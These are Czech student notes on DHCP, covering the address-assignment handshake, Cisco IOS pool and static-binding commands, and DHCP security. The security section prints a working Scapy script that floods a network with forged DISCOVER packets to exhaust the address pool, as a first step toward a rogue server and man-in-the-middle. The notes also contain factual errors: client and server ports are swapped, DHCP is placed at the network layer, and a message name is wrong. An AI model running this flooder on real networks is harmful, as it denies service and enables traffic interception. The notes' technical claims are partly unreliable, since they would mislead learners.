# DHCP - Dynamic Host Configuration Protocol

### Topika: Úvod, nastavení v IOS, security

## Úvod

port 67 - host

port 68 - server

*DHCP* je protokol nacházející se na Síťové vrstvě. Zajišťuje nám aby nové zařízení v síti mohli fungovat. Jelikož jim automaticky přiděluje potřebné věci. Jeho předchůdci jsou Reverse ARP a Bootstrap protokol. 

#### Statické DHCP
- DHCP tabulka si uchovává přiřazenou IP adresu k MAC tabulce, pomocí toho tak může mít zařízení pokaždé stejnou IP ikdyž se odpojí ze sítě. Využívá se pro servery. 

#### Přiřazení adresy
- probíhá 4 way handshakem.

> Host pošle DHCPDISCOVER na portu 68 na broadcast aby našel DHCP server
> 
> Server odpoví DHCPOFFER na portu 67 a nabídne adresu, hosta najde pomocí MAC adresy
> 
> Host pošle DHCPREQUEST na portu 68, žádá o nabídnutou IP adresu
> 
> Server odpoví DHCPACKNOWLEDGE na portu 67, server potvrzuje přiřazení adresy a zapisuje si ho do "poolu"

DHCP Přiřazuje hostům:
- IPv4 adresu
- NTP (pro analýzu)
- Gateway
- DNS server (například Cloudflare - 1.1.1.1 nebo Google - 8.8.8.8)

## Nastavení DHCP na Switchi nabo Routeru s IOS

#### Základní konfigurace DHCP
```
SW(config)#ip dhcp pool NETWORK1                          //vytvoří pool se jménem 
SW(dhcp-config)#network 192.168.190.0 255.255.255.0       //nastaví adresní rozsah
SW(dhcp-config)#default-router 192.168.190.1              //Gateway adresa
SW(dhcp-config)#dns-server 1.1.1.1 8.8.8.8                //adresy DNS serverů (můžeme nastavit až 8 adres)
SW(dhcp-config)#lease 30                                  //pronájem adresy na 30 dní, formátje den hodina minuta (tedy třeba 0 0 10 = 10 minut)
```

#### Konfigurace Statického DHCP
```
SW(dhcp-config)#host 192.168.190.9 255.255.255.0          // adresa pro klienta spolu s maskou
SW(dhcp-config)#client-identifier 0100.1217.59b0.73       // MAC adresa před kterou je typ media, 01 je pro Ethernet a tečka se posouvá
```

#### Užitečné příkazy
```
SWITCH#show ip dhcp bindings                              // seznam přidělených adres
SWITCH#clear ip dhcp bindings                             // vymaže seznam
SWITCH#show ip dhcp conflicts                             // seznam konfliktů
SW#clear ip dhcp conflicts                                // vymaže seznam konfliktů
SW#show ip dhcp pool                                      // informace o poolu
SW#show ip dhcp server statistics                         // statistiky serveru
```

## DHCP security
- Pro síť je špatně nastavené DHCP hrozba.

#### Startvation attack
- Útočník zahlcuje tabulku pro volne hosty pomocí scriptu. Poté můžu začít hostovat vlastní DHCP server, jelikož původní bude plný noví hostové budou dostávat adresu od útočníkovo DHCP serveru. Jelikož DHCP přiřazuje i gateway tak útočník zde může dát svoji IP adresu a jednoduše získat Man in the Middle útok.

Python script: 
- pozor jaký interface používáte
```
#!/usr/bin/python3
from scapy.all import *

conf.checkIPaddr = False  #Disable IP address checking

#Building DISCOVER packet
#Making an Ethernet packet
DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
            / IP(src='0.0.0.0', dst='255.255.255.255') \
            / UDP(dport=67,sport=68) \
            / BOOTP(op=1, chaddr=RandMAC()) \
            / DHCP(options=[('message-type','discover'), ('end')])

#Sending the crafted packet in a loop using the "eth0" interface
sendp(DHCP_DISCOVER, iface='eth0',loop=1,verbose=1 )-
```

Pro hostování DHCP serveru = https://udhcp.busybox.net/
